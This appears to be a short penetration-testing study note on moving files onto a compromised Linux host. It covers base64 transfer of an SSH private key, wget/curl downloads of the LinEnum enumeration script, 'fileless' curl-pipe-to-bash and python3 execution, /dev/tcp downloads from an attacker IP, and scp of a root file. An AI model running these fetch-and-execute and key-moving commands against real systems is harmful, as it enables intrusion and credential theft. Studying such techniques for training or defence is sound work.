# Linux Download Operations

Although Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses HTTP and HTTPS for communication.

## Base64 Encoding / Decoding

1. Pwnbox - Check File MD5 hash
md5sum id_rsa

2. Pwnbox - Encode SSH Key to Base64
cat id_rsa |base64 -w 0;echo

3. Target - Decode the File
echo -n 'LS0o=' | base64 -d > id_rsa

4. Target - Confirm the MD5 Hashes Match
md5sum id_rsa

## Web Downloads with Wget and cURL

Download a File Using wget
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

Download a File Using cURL
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

## Fileless Attacks Using Linux

--> download the payload and execute it directly without create a file

curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

wget -qO- http://$TARGET/flag.txt | python3


## Download with Bash (/dev/tcp)

exec 3<>/dev/tcp/10.10.10.32/80

echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

cat <&3

## SCP SSH Downloads

1. Enabling the SSH Server
sudo systemctl enable ssh

2. Starting the SSH Server
sudo systemctl start ssh

3. Checking for SSH Listening Port
netstat -lnpt

4. Linux - Downloading Files Using SCP
scp plaintext@192.168.49.128:/root/myroot.txt . 

